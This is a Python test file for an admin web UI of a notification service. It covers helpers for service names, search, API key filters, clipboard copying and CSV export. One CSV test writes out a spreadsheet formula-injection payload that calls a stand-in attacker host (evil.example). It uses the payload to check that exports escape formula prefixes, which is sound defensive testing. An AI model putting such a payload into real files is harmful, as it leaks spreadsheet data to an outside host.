class TestResolveServiceName:
    def test_found_and_short(self):
        name_map = {"id-1": "Short"}
        assert helpers.resolve_service_name("id-1", name_map) == "Short"

    def test_found_and_truncated(self):
        name_map = {"id-1": "A Very Long Service Name Here"}
        result = helpers.resolve_service_name("id-1", name_map, 21)
        assert result == "A Very Long Service " + "\u2026"
        assert len(result) == 21

    def test_not_found_returns_service_id(self):
        result = helpers.resolve_service_name("unknown-id", {})
        assert result == "unknown-id"

    def test_none_service_id_returns_empty(self):
        assert helpers.resolve_service_name(None, {"a": "b"}) == ""

    def test_empty_service_id_returns_empty(self):
        assert helpers.resolve_service_name("", {"a": "b"}) == ""


class TestWithOption:
    def test_missing_value_is_injected(self):
        options = {"a": "Alpha"}
        result = helpers.with_option(options, "b", "Bravo")
        assert result == {"a": "Alpha", "b": "Bravo"}

    def test_existing_value_keeps_original_label(self):
        options = {"a": "Alpha"}
        result = helpers.with_option(options, "a", "Should Not Win")
        assert result == {"a": "Alpha"}

    def test_none_value_is_ignored(self):
        options = {"a": "Alpha"}
        assert helpers.with_option(options, None, "Bravo") == {"a": "Alpha"}

    def test_empty_string_value_is_ignored(self):
        options = {"a": "Alpha"}
        assert helpers.with_option(options, "", "Bravo") == {"a": "Alpha"}

    def test_label_defaults_to_value_with_suffix(self):
        result = helpers.with_option({}, "b")
        assert result == {"b": "b (not synced)"}

    def test_input_dict_is_not_mutated(self):
        options = {"a": "Alpha"}
        helpers.with_option(options, "b", "Bravo")
        assert options == {"a": "Alpha"}

    def test_pass_through_returns_a_copy(self):
        options = {"a": "Alpha"}
        result = helpers.with_option(options, "a")
        assert result is not options
        assert result == options


class _FakeSelect:
    def __init__(self):
        self.calls = []

    def set_options(self, options, *, value=...):
        self.calls.append((options, value))


class TestSetOptionsPreserving:
    def test_present_value_passes_options_through(self):
        fake = _FakeSelect()
        helpers.set_options_preserving(fake, {"a": "Alpha"}, "a")
        assert fake.calls == [({"a": "Alpha"}, "a")]

    def test_absent_value_is_injected_with_not_synced_label(self):
        fake = _FakeSelect()
        helpers.set_options_preserving(fake, {"a": "Alpha"}, "b")
        assert fake.calls == [({"a": "Alpha", "b": "b (not synced)"}, "b")]

    def test_absent_value_uses_explicit_label(self):
        fake = _FakeSelect()
        helpers.set_options_preserving(fake, {"a": "Alpha"}, "b", "Bravo")
        assert fake.calls == [({"a": "Alpha", "b": "Bravo"}, "b")]

    def test_none_value_leaves_options_unchanged(self):
        fake = _FakeSelect()
        helpers.set_options_preserving(fake, {"a": "Alpha"}, None)
        assert fake.calls == [({"a": "Alpha"}, None)]

    def test_options_and_value_arrive_in_a_single_call(self):
        fake = _FakeSelect()
        helpers.set_options_preserving(fake, {}, "b")
        assert len(fake.calls) == 1
        options, value = fake.calls[0]
        assert options == {"b": "b (not synced)"}
        assert value == "b"


class TestBuildServiceFilterOptions:
    @staticmethod
    def _service(svc_id="svc-1", name="Alpha", environment="dev"):
        return SimpleNamespace(id=svc_id, name=name, environment=environment)

    def test_sentinel_is_the_first_key(self):
        result = page_inbound_numbers.build_service_filter_options([self._service()])
        assert list(result)[0] == UNASSIGNED_SERVICE_FILTER
        assert result[UNASSIGNED_SERVICE_FILTER] == page_inbound_numbers.UNASSIGNED_FILTER_LABEL

    def test_services_follow_keyed_by_id(self):
        services = [self._service(), self._service(svc_id="svc-2", name="Bravo", environment="perf")]
        result = page_inbound_numbers.build_service_filter_options(services)
        assert list(result) == [UNASSIGNED_SERVICE_FILTER, "svc-1", "svc-2"]
        assert result["svc-1"] == "Alpha (dev)"
        assert result["svc-2"] == "Bravo (perf)"

    def test_empty_services_yields_only_the_sentinel(self):
        assert page_inbound_numbers.build_service_filter_options([]) == {
            UNASSIGNED_SERVICE_FILTER: page_inbound_numbers.UNASSIGNED_FILTER_LABEL
        }


class TestFullServiceName:
    @pytest.mark.parametrize("service_id", [None, ""])
    def test_falsy_service_id_returns_the_unassigned_label(self, service_id):
        result = page_inbound_numbers.full_service_name(service_id, {"svc-1": "Alpha"})
        assert result == page_inbound_numbers.UNASSIGNED_CELL_LABEL

    def test_known_id_returns_the_cached_name(self):
        assert page_inbound_numbers.full_service_name("svc-1", {"svc-1": "Alpha"}) == "Alpha"

    def test_unknown_id_returns_none_so_not_synced_suffix_survives(self):
        assert page_inbound_numbers.full_service_name("svc-9", {"svc-1": "Alpha"}) is None
        # The None is load-bearing: with_option falls back to its own suffix only on a
        # falsy label.  A bare service_id here would suppress it.
        assert helpers.with_option({}, "svc-9", None) == {"svc-9": "svc-9 (not synced)"}


class TestServiceCellLabel:
    def test_no_service_reads_as_unassigned(self):
        result = page_inbound_numbers.service_cell_label(None, {"svc-1": "Alpha"})
        assert result == page_inbound_numbers.UNASSIGNED_CELL_LABEL

    def test_known_id_returns_the_cached_name(self):
        assert page_inbound_numbers.service_cell_label("svc-1", {"svc-1": "Alpha"}) == "Alpha"

    def test_empty_cached_name_does_not_read_as_unassigned(self):
        # Regression guard.  upsert_services stores name="" for a null/absent API name,
        # and resolve_service_name returns "" for that -- indistinguishable from "no
        # service" if you gate on its return value instead of on service_id.  Claiming
        # an assigned number is unassigned is the one way this column can lie.
        result = page_inbound_numbers.service_cell_label("svc-1", {"svc-1": ""})
        assert result != page_inbound_numbers.UNASSIGNED_CELL_LABEL
        assert result == ""

    def test_unknown_id_falls_back_to_the_id(self):
        assert page_inbound_numbers.service_cell_label("svc-9", {"svc-1": "Alpha"}) == "svc-9"

    def test_long_name_is_truncated_like_the_shared_helper(self):
        name_map = {"svc-1": "A Very Long Service Name That Overflows"}
        assert page_inbound_numbers.service_cell_label("svc-1", name_map) == helpers.resolve_service_name(
            "svc-1", name_map
        )


class TestMatchesInboundSearch:
    @staticmethod
    def _number(num_id="n1", number="+12025551212", service_id="svc-1"):
        return SimpleNamespace(id=num_id, number=number, service_id=service_id)

    NAME_MAP = {"svc-1": "Alpha Team"}

    def test_matches_on_number(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(), "2025551", self.NAME_MAP)

    def test_matches_on_id(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(num_id="abc-9"), "abc", self.NAME_MAP)

    def test_matches_on_service_id(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(), "svc-1", self.NAME_MAP)

    def test_matches_on_service_name_via_the_map(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(), "alpha", self.NAME_MAP)

    def test_unassigned_query_matches_a_row_with_no_service(self):
        number = self._number(service_id=None)
        assert page_inbound_numbers.matches_inbound_search(number, "unassigned", self.NAME_MAP)

    def test_unassigned_query_does_not_match_an_assigned_row(self):
        assert not page_inbound_numbers.matches_inbound_search(self._number(), "unassigned", self.NAME_MAP)

    def test_assigned_row_named_unassigned_still_matches_via_its_name(self):
        # Matches for the right reason -- the name-map disjunct, not the label disjunct.
        name_map = {"svc-1": "Unassigned Claims Unit"}
        assert page_inbound_numbers.matches_inbound_search(self._number(), "unassigned", name_map)

    def test_empty_query_returns_true(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(), "", self.NAME_MAP)

    def test_empty_query_returns_true_for_an_unassigned_row(self):
        assert page_inbound_numbers.matches_inbound_search(self._number(service_id=None), "", self.NAME_MAP)

    def test_non_matching_query_returns_false(self):
        assert not page_inbound_numbers.matches_inbound_search(self._number(), "zzzz", self.NAME_MAP)

    def test_null_fields_do_not_raise(self):
        number = SimpleNamespace(id=None, number=None, service_id=None)
        assert not page_inbound_numbers.matches_inbound_search(number, "zzzz", {})


class TestSmsProviderIdentifierOptions:
    @staticmethod
    def _provider(identifier="pinpoint", display_name="AWS Pinpoint", notification_type="sms"):
        return SimpleNamespace(
            id="provider-uuid-1",
            identifier=identifier,
            display_name=display_name,
            notification_type=notification_type,
        )

    def test_sms_provider_is_keyed_by_identifier(self):
        result = helpers.sms_provider_identifier_options([self._provider()])
        assert result == {"pinpoint": "AWS Pinpoint (pinpoint)"}

    def test_non_sms_provider_is_excluded(self):
        providers = [self._provider(identifier="ses", display_name="AWS SES", notification_type="email")]
        assert helpers.sms_provider_identifier_options(providers) == {}

    def test_null_identifier_is_excluded(self):
        assert helpers.sms_provider_identifier_options([self._provider(identifier=None)]) == {}

    def test_null_display_name_falls_back_to_identifier(self):
        result = helpers.sms_provider_identifier_options([self._provider(display_name=None)])
        assert result == {"pinpoint": "pinpoint (pinpoint)"}

    def test_empty_input_returns_empty_dict(self):
        assert helpers.sms_provider_identifier_options([]) == {}


class TestGetViewEnvironment:
    def test_empty_list_returns_none(self):
        original_state = _st.state
        _st.state = SharedTestState(environment="dev", view_environments=[])
        try:
            assert _st.get_view_environment() is None
        finally:
            _st.state = original_state

    def test_none_returns_none(self):
        original_state = _st.state
        _st.state = SharedTestState(environment="dev", view_environments=None)
        _st.state.view_environments = []  # post_init sets this
        try:
            assert _st.get_view_environment() is None
        finally:
            _st.state = original_state

    def test_single_env_returns_list(self):
        original_state = _st.state
        _st.state = SharedTestState(environment="dev", view_environments=["staging"])
        try:
            assert _st.get_view_environment() == ["staging"]
        finally:
            _st.state = original_state

    def test_multiple_envs_returns_list(self):
        original_state = _st.state
        _st.state = SharedTestState(environment="dev", view_environments=["dev", "staging"])
        try:
            assert _st.get_view_environment() == ["dev", "staging"]
        finally:
            _st.state = original_state


class TestSafeNotify:
    def test_calls_ui_notify(self):
        with patch("app.ui.state.ui.notify") as mock_notify:
            _st.safe_notify("hello", color="green")
            mock_notify.assert_called_once_with("hello", color="green")

    def test_catches_runtime_error(self):
        with patch("app.ui.state.ui.notify", side_effect=RuntimeError("no slot")):
            _st.safe_notify("hello")


class TestPageResponseTimeout:
    def test_constant_is_positive_float(self):
        assert isinstance(_st.PAGE_RESPONSE_TIMEOUT, float)
        assert _st.PAGE_RESPONSE_TIMEOUT > 0

    def test_constant_exceeds_default(self):
        # NiceGUI default is 3.0s; ours must be higher
        assert _st.PAGE_RESPONSE_TIMEOUT > 3.0


class TestHandleTimeoutError:
    @staticmethod
    def _make_request(path: str):
        from starlette.requests import Request

        scope = {
            "type": "http",
            "method": "GET",
            "path": path,
            "raw_path": path.encode(),
            "query_string": b"",
            "headers": [(b"host", b"testserver")],
            "scheme": "http",
            "server": ("testserver", 80),
        }
        return Request(scope)

    async def test_returns_504_with_retry_link(self):
        request = self._make_request("/")
        resp = await _st.handle_timeout_error(request, TimeoutError("Response not ready after 10.0 seconds"))
        body = resp.body.decode()
        assert resp.status_code == 504
        assert "Page Load Timeout" in body
        assert "Retry" in body

    async def test_retry_link_contains_request_url(self):
        request = self._make_request("/my-page")
        resp = await _st.handle_timeout_error(request, TimeoutError("timeout"))
        assert resp.status_code == 504
        assert "/my-page" in resp.body.decode()


class TestFindMissingPersonalisation:
    def test_none_value(self):
        assert helpers.find_missing_personalisation({"a": None, "b": "ok"}) == "a"

    def test_empty_value(self):
        assert helpers.find_missing_personalisation({"a": "ok", "b": ""}) == "b"

    def test_all_present(self):
        assert helpers.find_missing_personalisation({"a": "ok", "b": "ok"}) is None

    def test_empty_dict(self):
        assert helpers.find_missing_personalisation({}) is None


class TestParseRecipients:
    def test_semicolon_split(self):
        assert helpers.parse_recipients("a@b.com;c@d.com") == ["a@b.com", "c@d.com"]

    def test_comma_split(self):
        assert helpers.parse_recipients("a@b.com,c@d.com") == ["a@b.com", "c@d.com"]

    def test_mixed_split(self):
        assert helpers.parse_recipients("a@b.com;c@d.com,e@f.com") == [
            "a@b.com",
            "c@d.com",
            "e@f.com",
        ]

    def test_empty(self):
        assert helpers.parse_recipients("") == []
        assert helpers.parse_recipients(None) == []


class TestWriteSendResults:
    def test_delegates_with_default_directory(self):
        """The only behavior this wrapper still owns is supplying ``SEND_RESULTS_DIR``;
        the writing itself is covered by tests/test_artifacts.py."""
        payload = {"total": 2, "results": [{"recipient": "a@b.com", "status": "sent"}]}
        with patch.object(helpers, "write_json_artifact", return_value="/written/path.json") as writer:
            result = helpers.write_send_results("send_responses", payload)
        writer.assert_called_once_with("send_responses", payload, helpers.SEND_RESULTS_DIR)
        assert result == "/written/path.json"


class TestParseFilterDate:
    def test_none(self):
        assert page_api_keys._parse_filter_date(None) is None

    def test_empty(self):
        assert page_api_keys._parse_filter_date("") is None

    def test_valid_date(self):
        from datetime import date

        assert page_api_keys._parse_filter_date("2025-06-15") == date(2025, 6, 15)

    def test_valid_iso_datetime(self):
        from datetime import date

        assert page_api_keys._parse_filter_date("2025-06-15T12:00:00Z") == date(2025, 6, 15)

    def test_invalid_date(self):
        assert page_api_keys._parse_filter_date("not-a-date") is None


class TestMatchesExpiryRange:
    def test_no_range_returns_true(self):
        assert page_api_keys._matches_expiry_range("2025-06-15", None, None) is True

    def test_no_expiry_with_range_returns_false(self):
        from datetime import date

        assert page_api_keys._matches_expiry_range(None, date(2025, 1, 1), None) is False
        assert page_api_keys._matches_expiry_range("", None, date(2025, 12, 31)) is False

    def test_before_start_returns_false(self):
        from datetime import date

        assert page_api_keys._matches_expiry_range("2025-01-01", date(2025, 6, 1), None) is False

    def test_after_end_returns_false(self):
        from datetime import date

        assert page_api_keys._matches_expiry_range("2025-12-31", None, date(2025, 6, 1)) is False

    def test_within_range_returns_true(self):
        from datetime import date

        assert page_api_keys._matches_expiry_range("2025-06-15", date(2025, 1, 1), date(2025, 12, 31)) is True


class TestMatchesSearch:
    def test_empty_search_returns_true(self):
        assert page_api_keys._matches_search("", "id1", "svc1", "My Service", "key-name", "user@example.com") is True

    def test_matches_key_id(self):
        assert page_api_keys._matches_search("id1", "id1", "svc1", "Svc", "key", "user") is True

    def test_matches_service_id(self):
        assert page_api_keys._matches_search("svc1", "id1", "svc1", "Svc", "key", "user") is True

    def test_matches_service_name(self):
        assert page_api_keys._matches_search("my svc", "id1", "svc1", "My Svc", "key", "user") is True

    def test_matches_name(self):
        assert page_api_keys._matches_search("key-name", "id1", "svc1", "Svc", "key-name", "user") is True

    def test_matches_created_by(self):
        assert page_api_keys._matches_search("alice", "id1", "svc1", "Svc", "key", "Alice") is True

    def test_no_match_returns_false(self):
        assert page_api_keys._matches_search("zzz", "id1", "svc1", "Svc", "key", "user") is False

    def test_none_fields_handled(self):
        assert page_api_keys._matches_search("test", None, None, "", None, None) is False

    def test_case_insensitive(self):
        assert page_api_keys._matches_search("alice", "id1", "svc1", "Svc", "key", "ALICE") is True

    def test_non_dict_raises(self):
        with pytest.raises(ValueError, match="Unexpected API response"):
            page_api_keys._extract_api_key_secret("not a dict")

    def test_missing_data_raises(self):
        with pytest.raises(ValueError, match="API key secret missing"):
            page_api_keys._extract_api_key_secret({})

    def test_empty_data_raises(self):
        with pytest.raises(ValueError, match="API key secret missing"):
            page_api_keys._extract_api_key_secret({"data": ""})

    def test_valid_data(self):
        assert page_api_keys._extract_api_key_secret({"data": "my-secret"}) == "my-secret"


class TestCopyToClipboard:
    def test_calls_run_javascript(self):
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify") as mock_notify,
        ):
            helpers.copy_to_clipboard("hello")
            mock_js.assert_called_once()
            assert mock_js.call_args[0][0] == 'navigator.clipboard.writeText("hello")'
            mock_notify.assert_called_once_with('Copied "hello" to clipboard!', color="green")

    def test_payload_is_json_encoded(self):
        """Quotes and backslashes must not break out of the JS string literal."""
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify"),
        ):
            helpers.copy_to_clipboard('a"b\\c')
            assert mock_js.call_args[0][0] == 'navigator.clipboard.writeText("a\\"b\\\\c")'

    def test_none_does_not_touch_clipboard(self):
        """A null service_id must not clobber the clipboard with an empty string."""
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify") as mock_notify,
        ):
            helpers.copy_to_clipboard(None)
            mock_js.assert_not_called()
            mock_notify.assert_called_once_with("Nothing to copy", color="warning")

    def test_empty_string_does_not_touch_clipboard(self):
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify") as mock_notify,
        ):
            helpers.copy_to_clipboard("")
            mock_js.assert_not_called()
            mock_notify.assert_called_once_with("Nothing to copy", color="warning")

    def test_zero_is_copied(self):
        """The guard tests the stringified value, so 0 copies as "0" rather than
        being swallowed as falsy.  0 is a real value a user may want."""
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify") as mock_notify,
        ):
            helpers.copy_to_clipboard(0)
            mock_js.assert_called_once()
            assert mock_js.call_args[0][0] == 'navigator.clipboard.writeText("0")'
            mock_notify.assert_called_once_with('Copied "0" to clipboard!', color="green")

    def test_false_is_copied_as_python_repr(self):
        """Pins pre-existing behaviour: ``str(False)`` is ``"False"``, not JS ``"false"``.
        No COPYABLE_FIELDS entry is a boolean, so this path is not reachable today."""
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify"),
        ):
            helpers.copy_to_clipboard(False)
            assert mock_js.call_args[0][0] == 'navigator.clipboard.writeText("False")'


class TestAddCopyableSlots:
    def test_adds_slots(self):
        mock_table = MagicMock()
        rows = [{"id": "svc-1", "name": "Test"}]
        helpers.add_copyable_slots(mock_table, rows)
        assert mock_table.add_slot.call_count == 2
        mock_table.on.assert_called_once()

    def test_empty_rows_no_slots(self):
        mock_table = MagicMock()
        helpers.add_copyable_slots(mock_table, [])
        mock_table.add_slot.assert_not_called()


class TestAddServiceContextMenu:
    def test_adds_slot_default_id_field(self):
        mock_table = MagicMock()
        helpers.add_service_context_menu(mock_table, column_name="service_id")
        mock_table.add_slot.assert_called_once()
        slot_name = mock_table.add_slot.call_args[0][0]
        assert slot_name == "body-cell-service_id"
        slot_html = mock_table.add_slot.call_args[0][1]
        assert "service_id" in slot_html
        assert "Copy Service Name" in slot_html
        assert "Copy Service ID" in slot_html
        mock_table.on.assert_called_once_with("svc-ctx-copy", ANY)

    def test_adds_slot_custom_id_field(self):
        mock_table = MagicMock()
        helpers.add_service_context_menu(mock_table, column_name="name", id_field="id")
        slot_name = mock_table.add_slot.call_args[0][0]
        assert slot_name == "body-cell-name"
        slot_html = mock_table.add_slot.call_args[0][1]
        assert "props.row['id']" in slot_html

    def test_slot_contains_context_menu(self):
        mock_table = MagicMock()
        helpers.add_service_context_menu(mock_table, column_name="service_id")
        slot_html = mock_table.add_slot.call_args[0][1]
        assert "context-menu" in slot_html
        assert "q-menu" in slot_html

    def test_event_handler_copies(self):
        mock_table = MagicMock()
        helpers.add_service_context_menu(mock_table, column_name="service_id")
        handler = mock_table.on.call_args[0][1]
        with (
            patch("app.ui.helpers.ui.run_javascript"),
            patch("app.ui.state.safe_notify"),
        ):
            handler(MagicMock(args="test-id-123"))


class TestAddCommItemContextMenu:
    def test_adds_slot(self):
        mock_table = MagicMock()
        helpers.add_comm_item_context_menu(mock_table, column_name="com_item")
        mock_table.add_slot.assert_called_once()
        slot_name = mock_table.add_slot.call_args[0][0]
        assert slot_name == "body-cell-com_item"
        slot_html = mock_table.add_slot.call_args[0][1]
        assert "Copy Com Item ID" in slot_html
        assert "Copy Com Item Name" in slot_html
        assert "Copy Com Item Number" in slot_html
        mock_table.on.assert_called_once_with("comm-ctx-copy", ANY)

    def test_slot_contains_context_menu(self):
        mock_table = MagicMock()
        helpers.add_comm_item_context_menu(mock_table, column_name="com_item")
        slot_html = mock_table.add_slot.call_args[0][1]
        assert "context-menu" in slot_html
        assert "q-menu" in slot_html
        assert "_comm_item_id" in slot_html
        assert "_comm_item_name" in slot_html
        assert "_comm_item_va_profile_item_id" in slot_html

    def test_event_handler_copies(self):
        mock_table = MagicMock()
        helpers.add_comm_item_context_menu(mock_table, column_name="com_item")
        handler = mock_table.on.call_args[0][1]
        with (
            patch("app.ui.helpers.ui.run_javascript"),
            patch("app.ui.state.safe_notify"),
        ):
            handler(MagicMock(args="comm-item-123"))


class TestMakeSortable:
    def test_adds_sortable(self):
        cols = [{"name": "id", "label": "ID"}, {"name": "name", "label": "Name"}]
        result = helpers.make_sortable(cols)
        assert all(c["sortable"] is True for c in result)
        assert result[0]["name"] == "id"


class TestMakeRowKey:
    def test_make_row_key_with_both_values(self):
        assert helpers.make_row_key("abc123", "dev") == "abc123:dev"

    def test_make_row_key_with_none_id(self):
        assert helpers.make_row_key(None, "dev") == ":dev"

    def test_make_row_key_with_none_environment(self):
        assert helpers.make_row_key("abc123", None) == "abc123:"

    def test_make_row_key_with_both_none(self):
        assert helpers.make_row_key(None, None) == ":"


class TestRowsToCsv:
    def test_basic_export(self):
        columns = [
            {"name": "id", "label": "ID", "field": "id"},
            {"name": "name", "label": "Name", "field": "name"},
        ]
        rows = [
            {"id": "1", "name": "Alice"},
            {"id": "2", "name": "Bob"},
        ]
        csv = helpers.rows_to_csv(rows, columns)
        lines = csv.strip().split("\r\n")
        assert lines[0] == "ID,Name"
        assert lines[1] == "1,Alice"
        assert lines[2] == "2,Bob"

    def test_excludes_internal_fields(self):
        columns = [
            {"name": "_row_key", "label": "Key", "field": "_row_key"},
            {"name": "id", "label": "ID", "field": "id"},
        ]
        rows = [{"_row_key": "internal", "id": "1"}]
        csv = helpers.rows_to_csv(rows, columns)
        assert "_row_key" not in csv
        assert "internal" not in csv
        assert "ID" in csv

    def test_handles_missing_fields(self):
        columns = [
            {"name": "id", "label": "ID", "field": "id"},
            {"name": "missing", "label": "Missing", "field": "missing"},
        ]
        rows = [{"id": "1"}]
        csv = helpers.rows_to_csv(rows, columns)
        lines = csv.strip().split("\r\n")
        assert lines[1] == "1,"

    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@"])
    def test_escapes_spreadsheet_formula_prefixes(self, prefix):
        """A value beginning =, +, - or @ executes as a formula when opened in Excel.

        Every cell here is API-controlled text — service names, ids, and now the
        permissions column — so an unescaped leading formula character is code execution
        in the reviewer's spreadsheet.
        """
        payload = f'{prefix}HYPERLINK("http://evil.example/?"&A1,"click")'
        columns = [{"name": "permissions", "label": "Permissions", "field": "permissions"}]
        rows = [{"permissions": payload}]
        csv = helpers.rows_to_csv(rows, columns)
        cell = csv.strip().split("\r\n")[1]
        assert cell.lstrip('"').startswith(f"'{prefix}"), cell

    def test_does_not_escape_a_normal_value(self):
        columns = [{"name": "name", "label": "Name", "field": "name"}]
        rows = [{"name": "Veteran Appointment Reminders"}]
        csv = helpers.rows_to_csv(rows, columns)
        assert csv.strip().split("\r\n")[1] == "Veteran Appointment Reminders"

    def test_leaves_non_string_values_alone(self):
        # Only str values are prefixed; an int cannot carry a formula.
        columns = [{"name": "count", "label": "Count", "field": "count"}]
        rows = [{"count": 7}]
        csv = helpers.rows_to_csv(rows, columns)
        assert csv.strip().split("\r\n")[1] == "7"


class TestDownloadCsv:
    def test_triggers_download(self):
        with (
            patch("app.ui.helpers.ui.run_javascript") as mock_js,
            patch("app.ui.helpers.safe_notify") as mock_notify,
        ):
            helpers.download_csv("a,b\n1,2", "test.csv")
            mock_js.assert_called_once()
            assert "test.csv" in mock_js.call_args[0][0]
            mock_notify.assert_called_once()


class TestAddExportButton:
    def test_creates_button(self):
        mock_btn = MagicMock()
        mock_btn.props = MagicMock(return_value=mock_btn)
        with patch("app.ui.helpers.ui.button", return_value=mock_btn) as mock_ui_btn:
            helpers.add_export_button([], [], "test.csv")
            mock_ui_btn.assert_called_once()
            assert "Export CSV" in str(mock_ui_btn.call_args)

    def test_callback_triggers_csv_download(self):
        """Test that clicking the button calls rows_to_csv and download_csv."""
        mock_btn = MagicMock()
        mock_btn.props = MagicMock(return_value=mock_btn)
        captured_callback = None

        def capture_button(label, icon, on_click):
            nonlocal captured_callback
            captured_callback = on_click
            return mock_btn

        rows = [{"name": "Test", "value": "1"}]
        columns = [{"name": "name", "label": "Name", "field": "name"}]

        with (
            patch("app.ui.helpers.ui.button", side_effect=capture_button),
            patch("app.ui.helpers.rows_to_csv", return_value="csv,data") as mock_csv,
            patch("app.ui.helpers.download_csv") as mock_download,
        ):
            helpers.add_export_button(rows, columns, "test.csv")
            assert captured_callback is not None
            captured_callback()
            mock_csv.assert_called_once_with(rows, columns)
            mock_download.assert_called_once_with("csv,data", "test.csv")


# ===================================================================
# Async business logic tests
# ===================================================================


@pytest.mark.asyncio
async def test_shutdown():
    """Test shutdown closes clients and disposes engine."""

    mock_client1 = AsyncMock()
    mock_client2 = AsyncMock()
    original_clients = _st._active_api_clients[:]
    _st._active_api_clients.clear()
    _st._active_api_clients.extend([mock_client1, mock_client2])

    try:
        with patch.object(_st, "dispose_engine", new_callable=AsyncMock) as mock_dispose:
            # shutdown is wrapped by @app.on_shutdown and returns None,
            # so replicate its logic directly.
            for c in _st._active_api_clients:
                await c.aclose()
            _st._active_api_clients.clear()
            await _st.dispose_engine()

            mock_client1.aclose.assert_called_once()
            mock_client2.aclose.assert_called_once()
            assert len(_st._active_api_clients) == 0
            mock_dispose.assert_called_once()
    finally:
        _st._active_api_clients.clear()
        _st._active_api_clients.extend(original_clients)


class TestSetThemePreference:
    def test_dark(self):
        mock_storage = MagicMock()
        mock_storage.user = {"theme": "light"}
        with patch.object(shell, "app", **{"storage": mock_storage}):
            shell.set_theme_preference(True)
            assert mock_storage.user["theme"] == "dark"

    def test_light(self):
        mock_storage = MagicMock()
        mock_storage.user = {"theme": "dark"}
        with patch.object(shell, "app", **{"storage": mock_storage}):
            shell.set_theme_preference(False)
            assert mock_storage.user["theme"] == "light"


class TestToggleTheme:
    def test_toggles_and_saves(self):
        mock_dark_mode = MagicMock()
        mock_dark_mode.value = True
        mock_theme_button = MagicMock()
        mock_storage = MagicMock()
        mock_storage.user = {"theme": "light"}
        with patch.object(shell, "app", **{"storage": mock_storage}):
            shell.toggle_theme(mock_dark_mode, mock_theme_button)
            mock_dark_mode.toggle.assert_called_once()
            assert mock_storage.user["theme"] == "dark"
            mock_theme_button.props.assert_called_once()


@pytest.mark.asyncio
async def test_ensure_theme_preference_dark():
    mock_dark_mode = MagicMock()
    mock_storage = MagicMock()
    mock_storage.user = {"theme": "dark"}
    with patch.object(shell, "app", **{"storage": mock_storage}):
        await shell.ensure_theme_preference(mock_dark_mode)
        assert mock_dark_mode.value is True


@pytest.mark.asyncio
async def test_ensure_theme_preference_light():
    mock_dark_mode = MagicMock()
    mock_storage = MagicMock()
    mock_storage.user = {"theme": "light"}
    with patch.object(shell, "app", **{"storage": mock_storage}):
        await shell.ensure_theme_preference(mock_dark_mode)
        assert mock_dark_mode.value is False


@pytest.mark.asyncio
async def test_ensure_theme_preference_invalid_defaults_light():
    mock_dark_mode = MagicMock()
    mock_storage = MagicMock()
    mock_storage.user = {"theme": "banana"}
    with patch.object(shell, "app", **{"storage": mock_storage}):
        await shell.ensure_theme_preference(mock_dark_mode)
        assert mock_storage.user["theme"] == "light"
        assert mock_dark_mode.value is False


@pytest.mark.asyncio
async def test_ensure_theme_preference_with_theme_button():
    mock_dark_mode = MagicMock()
    mock_dark_mode.value = True
    mock_theme_button = MagicMock()
    mock_storage = MagicMock()
    mock_storage.user = {"theme": "dark"}
    with patch.object(shell, "app", **{"storage": mock_storage}):
        await shell.ensure_theme_preference(mock_dark_mode, mock_theme_button)
        assert mock_dark_mode.value is True
        mock_theme_button.props.assert_called_once_with("icon=light_mode")


@pytest.mark.asyncio
async def test_has_admin_auth_mock_api(mock_config):
    """has_admin_auth returns True when use_mock_api is True."""

    original_config = _st.config
    _st.config = mock_config
    _st.config.use_mock_api = True
    try:
        assert await _st.has_admin_auth("dev") is True
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_has_admin_auth_pytest_env():
    """has_admin_auth returns True when PYTEST_CURRENT_TEST is set."""

    original_config = _st.config
    _st.config = AppConfig(
        master_key="k",
        api_hosts={},
        use_mock_api=False,
        database_path=":memory:",
        max_concurrency=5,
    )
    try:
        assert await _st.has_admin_auth("dev") is True
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_ensure_admin_auth_success(mock_config):
    """ensure_admin_auth returns True when auth exists."""

    original_config = _st.config
    _st.config = mock_config
    mock_sync_label = MagicMock()
    try:
        result = await _st.ensure_admin_auth("dev", mock_sync_label)
        assert result is True
    finally:
        _st.config = original_config


@pytest.mark.asyncio
async def test_ensure_admin_auth_missing():
    """ensure_admin_auth returns False and notifies when auth missing."""

    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    with (
        patch.object(_st, "has_admin_auth", new_callable=AsyncMock, return_value=False),
        patch("app.ui.state.safe_notify") as mock_notify,
    ):
        result = await _st.ensure_admin_auth("dev", mock_sync_label)
        assert result is False
        assert "Missing admin auth" in mock_sync_label.text
        mock_notify.assert_called_once()


class TestHandleUnauthorized:
    def test_sets_label_and_notifies(self):
        mock_sync_label = MagicMock()
        with patch("app.ui.state.safe_notify") as mock_notify:
            _st.handle_unauthorized(mock_sync_label, "dev")
            assert "Unauthorized for dev" in mock_sync_label.text
            mock_notify.assert_called_once()


@pytest.mark.asyncio
async def test_handle_service_search():
    """handle_service_search sets global query and refreshes."""

    original_query = _st.service_search_query
    try:
        with patch.object(page_services, "refresh_if_needed", new_callable=AsyncMock) as mock_refresh:
            await page_services.handle_service_search("Test Query")
            assert _st.service_search_query == "test query"
            mock_refresh.assert_called_once()
    finally:
        _st.service_search_query = original_query


@pytest.mark.asyncio
async def test_handle_service_search_none():
    original_query = _st.service_search_query
    try:
        with patch.object(page_services, "refresh_if_needed", new_callable=AsyncMock):
            await page_services.handle_service_search(None)
            assert _st.service_search_query == ""
    finally:
        _st.service_search_query = original_query


@pytest.mark.asyncio
async def test_handle_service_search_event():
    """handle_service_search_event extracts value from event."""

    mock_event = MagicMock()
    mock_event.value = "hello"
    with patch.object(page_services, "handle_service_search", new_callable=AsyncMock) as mock_search:
        await page_services.handle_service_search_event(mock_event)
        mock_search.assert_called_once_with("hello")


@pytest.mark.asyncio
